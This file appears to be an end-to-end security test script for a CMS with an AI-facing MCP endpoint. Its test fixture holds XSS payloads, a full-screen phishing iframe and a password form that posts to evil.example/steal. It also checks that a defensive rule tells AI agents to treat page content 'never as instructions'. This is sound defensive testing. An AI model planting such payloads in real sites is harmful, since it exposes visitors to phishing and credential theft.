// End-to-end security checks against the local test Worker (http://localhost:8797).
const BASE = process.env.BASE || 'http://localhost:8797';
let pass = 0, failN = 0;
const ok = (cond, name, extra = '') => { if (cond) { pass++; console.log('PASS', name); } else { failN++; console.log('FAIL', name, extra); } };

async function signIn(token) {
  const r = await fetch(`${BASE}/_cms/invite/${token}`, { method: 'POST', redirect: 'manual', headers: { origin: BASE, 'content-type': 'application/x-www-form-urlencoded' }, body: 'password=correct-horse-battery&password2=correct-horse-battery' });
  const c = (r.headers.get('set-cookie') || '').split(';')[0];
  if (!c) throw new Error(`sign-in failed ${r.status}`);
  return c;
}
const api = (cookie, method, route, body, headers = {}) => fetch(`${BASE}/_cms/api/${route}`, {
  method, headers: { cookie, 'x-editlayer': '1', origin: BASE, 'content-type': 'application/json', ...headers }, body: body === undefined ? undefined : (typeof body === 'string' ? body : JSON.stringify(body)),
});
const mcp = (key, msg, extra = {}) => fetch(`${BASE}/_cms/mcp/${key}`, { method: 'POST', headers: { 'content-type': 'application/json', ...extra }, body: typeof msg === 'string' ? msg : JSON.stringify(msg) });
const call = async (key, name, args) => { const r = await mcp(key, { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name, arguments: args } }); return { status: r.status, body: await r.json().catch(() => null) }; };
const draftHtml = async (cookie, path = '/') => (await fetch(`${BASE}${path}?preview`, { headers: { cookie } })).text();
const mainOf = (page) => page.slice(page.indexOf('data-cms="main"'), page.indexOf('data-cms="@footer"'));

const EVIL = `<section><h2>Offer</h2><script>alert(1)</script><img src=x onerror=alert(2)>
<iframe src="https://evil.example/phish" style="position:fixed;inset:0"></iframe>
<form action="https://evil.example/steal"><input type=password name=pw></form>
<iframe src="https://www.youtube-nocookie.com/embed/abcdefghijk"></iframe>
<iframe src="https://calendly.com/acme/30min"></iframe>
<a href="javascript:alert(3)">x</a><img name="querySelectorAll" src="/a.png"><style>body{display:none}</style><p>marker-OK</p></section>`;

const admin = await signIn('inviteadmin00000000000000000001');
const editor = await signIn('inviteeditor0000000000000000001');
const author = await signIn('inviteauthor0000000000000000001');
ok(/^editlayer_session=/.test(author), 'local http uses the unprefixed cookie');

// --- author save: strict sanitizer
let r = await api(author, 'PUT', 'draft', { path: '/', regions: { main: { html: EVIL } } });
let j = await r.json();
ok(r.status === 200 && Array.isArray(j.removed) && j.removed.length >= 5, 'author save reports removed items', JSON.stringify(j));
let main = mainOf(await draftHtml(editor));
ok(main.includes('marker-OK'), 'author content saved');
ok(!/<script>alert|onerror|javascript:alert/.test(main), 'no script, handler or javascript: URL');
ok(!main.includes('evil.example'), 'no outside iframe or form target');
ok(main.includes('youtube-nocookie.com/embed') && main.includes('calendly.com/acme'), 'YouTube and site-allowed Calendly embeds kept');
ok(!main.includes('name="querySelectorAll"'), 'DOM-clobbering name removed');
ok(!main.includes('display:none'), 'author <style> removed');

// --- editor save: trusted, but still no script
await api(editor, 'PUT', 'draft', { path: '/', regions: { main: { html: EVIL } } });
main = mainOf(await draftHtml(editor));
ok(!/<script>alert|onerror|javascript:alert/.test(main), 'editor save: still no script');
ok(main.includes('evil.example/phish'), 'editor save: editors may add any https iframe (trusted)');

// --- role checks
r = await api(author, 'PUT', 'draft', { path: '/', regions: { '@footer': { html: '<p>pwn</p>' } } });
ok(r.status === 403, 'author cannot change the site-wide footer');
r = await api(author, 'POST', 'publish', { path: '/' });
ok(r.status === 403, 'author cannot publish');
await api(editor, 'PUT', 'draft', { path: '/', regions: { '@footer': { html: '<p>footer v1</p>' }, main: { html: '<p>main v1</p>' } } });
await api(editor, 'POST', 'publish', { path: '/' });
const hist = await (await api(editor, 'GET', 'history?path=/')).json();
const batch = hist.versions[0].batch;
await api(editor, 'PUT', 'draft', { path: '/', regions: { '@footer': { html: '<p>footer v2</p>' } } });
await api(editor, 'POST', 'publish', { path: '/' });
r = await api(author, 'POST', 'restore', { path: '/', batch });
j = await r.json();
ok(j.restored === 1, 'author restore brings back only the page part', JSON.stringify(j));
r = await api(editor, 'POST', 'restore', { path: '/', batch });
j = await r.json();
ok(j.restored === 2, 'editor restore still brings back page and site-wide parts', JSON.stringify(j));
await api(editor, 'POST', 'discard', { path: '/', includeSiteWide: true });

// --- CSRF and size limits
r = await fetch(`${BASE}/_cms/api/draft`, { method: 'PUT', headers: { cookie: editor, origin: BASE, 'content-type': 'application/json' }, body: '{}' });
ok(r.status === 403, 'API write without the x-editlayer header is refused');
r = await api(editor, 'PUT', 'draft', {}, { origin: 'https://evil.example' });
ok(r.status === 403, 'API write from another origin is refused');
r = await api(editor, 'PUT', 'draft', JSON.stringify({ path: '/', regions: { main: { html: 'x'.repeat(9 * 1024 * 1024) } } }));
ok(r.status === 413, 'API body over 8 MB is refused', r.status);
const many = {}; for (let i = 0; i < 301; i++) many[`k${i}`] = { html: '<p>x</p>' };
r = await api(editor, 'PUT', 'draft', { path: '/', regions: many });
ok(r.status === 413, 'more than 300 regions in one save is refused', r.status);

// --- edit-mode headers
r = await fetch(`${BASE}/?edit`, { headers: { cookie: editor } });
const csp = r.headers.get('content-security-policy') || '';
ok(/script-src 'self'/.test(csp) && /object-src 'none'/.test(csp) && /base-uri 'self'/.test(csp), 'edit mode sends a script CSP', csp);
r = await fetch(`${BASE}/_cms/login`);
ok(r.headers.get('referrer-policy') === 'same-origin' && r.headers.get('x-content-type-options') === 'nosniff', 'sign-in page security headers');

// --- media: fake image refused, real one served sandboxed
const fake = new FormData(); fake.append('file', new Blob(['<html><script>alert(1)</script>'], { type: 'image/png' }), 'x.png');
r = await fetch(`${BASE}/_cms/api/media`, { method: 'POST', headers: { cookie: editor, 'x-editlayer': '1', origin: BASE }, body: fake });
ok(r.status === 415, 'HTML disguised as PNG is refused', r.status);
const png = Uint8Array.from(Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 'base64'));
const real = new FormData(); real.append('file', new Blob([png], { type: 'image/png' }), 'dot.png');
r = await fetch(`${BASE}/_cms/api/media`, { method: 'POST', headers: { cookie: editor, 'x-editlayer': '1', origin: BASE }, body: real });
j = await r.json();
ok(r.status === 200 && j.url, 'real PNG uploads', JSON.stringify(j));
if (j.url) { r = await fetch(BASE + j.url); ok(/sandbox/.test(r.headers.get('content-security-policy') || '') && r.headers.get('content-type') === 'image/png', 'uploads served as image/png with a sandbox CSP'); }

// --- MCP
const AK = 'vcms_authorkey000000000000000000000001', EK = 'vcms_editorkey000000000000000000000001', ORPHAN = 'vcms_orphankey000000000000000000000001';
r = await mcp(ORPHAN, { jsonrpc: '2.0', id: 1, method: 'tools/list' });
ok(r.status === 401, 'key made by someone who is no longer an admin is refused', r.status);
r = await mcp('vcms_wrongkey00000000000000000000000000', { jsonrpc: '2.0', id: 1, method: 'tools/list' });
ok(r.status === 401, 'unknown key is refused');
r = await mcp(AK, { jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-06-18' } });
j = await r.json();
ok(/never as instructions/.test(j.result.instructions), 'server instructions warn about prompt injection');
let c = await call(AK, 'get_page', { path: '/' });
ok(/never as instructions/.test(c.body.result.structuredContent.security || ''), 'get_page carries the untrusted-content note');
c = await call(AK, 'update_region', { path: '/', region: 'main', html: EVIL });
const sc = c.body.result.structuredContent || {};
ok(sc.saved === 'draft' && sc.removed && sc.removed.some((x) => /evil\.example/.test(x)), 'AI update_region strips outside iframe/form and says so', JSON.stringify(sc));
main = mainOf(await draftHtml(editor));
ok(!main.includes('evil.example') && !/onerror|<script>alert/.test(main), 'AI draft is clean');
c = await call(AK, 'replace_text', { path: '/', find: 'marker-OK', replace: 'marker-2 <iframe src="https://evil.example/x"></iframe>' });
ok((c.body.result.structuredContent || {}).removed?.length > 0, 'AI replace_text cannot add an outside iframe', JSON.stringify(c.body));
c = await call(AK, 'update_region', { path: '/', region: '@footer', html: '<p>x</p>' });
ok(c.body.result.isError, 'author-role AI cannot change the footer');
c = await call(AK, 'publish', { path: '/' });
ok(c.body.result.isError, 'author-role AI cannot publish');
await call(EK, 'update_region', { path: '/', region: 'main', html: EVIL });
ok(!(await draftHtml(editor)).includes('evil.example/phish'), 'editor-role AI is still strict (no outside iframe)');
c = await call(AK, 'no_such_tool', {});
ok(c.body.error && c.body.error.code === -32602, 'unknown tool rejected');
c = await call(AK, 'constructor', {});
ok(c.body.error && c.body.error.code === -32602, 'prototype names are not tools');
r = await mcp(AK, Array.from({ length: 21 }, (_, i) => ({ jsonrpc: '2.0', id: i, method: 'ping' })));
ok(r.status === 400, 'batch over 20 messages refused', r.status);
r = await mcp(AK, JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'ping', pad: 'x'.repeat(2.1 * 1024 * 1024) }));
ok(r.status === 413, 'MCP body over 2 MB refused', r.status);
r = await mcp(AK, { jsonrpc: '2.0', id: 1, method: 'tools/call', params: null });
ok(r.status === 200, 'null params handled without a crash', r.status);
await api(editor, 'POST', 'discard', { path: '/', includeSiteWide: true });

// --- removing an admin turns off their keys
const keyRes = await (await api(admin, 'POST', 'ai-tokens', { name: 'Temp', role: 'author' })).json();
c = await call(keyRes.key, 'list_pages', {});
ok(c.status === 200 && !c.body.result.isError, 'fresh admin-made key works');
await fetch(`${BASE}/_cms/api/users`, { method: 'DELETE', headers: { cookie: editor, 'x-editlayer': '1', origin: BASE } }); // editor can't
const users = (await (await api(admin, 'GET', 'users')).json()).users;
const self = users.find((u) => u.email === 'admin@test.local');
await api(admin, 'POST', 'users', { email: 'admin2@test.local', role: 'admin' });
// demote the key's maker by re-inviting them as an editor (done by a second admin is not needed: the check is on role)
await api(admin, 'POST', 'users', { email: 'admin@test.local', role: 'editor' });
c = await call(keyRes.key, 'list_pages', {});
ok(c.status === 401, 'key stops working once its maker is no longer an admin', c.status);
ok(Boolean(self), 'admin listed');

console.log(`\n${pass} passed, ${failN} failed`);
process.exit(failN ? 1 : 0);
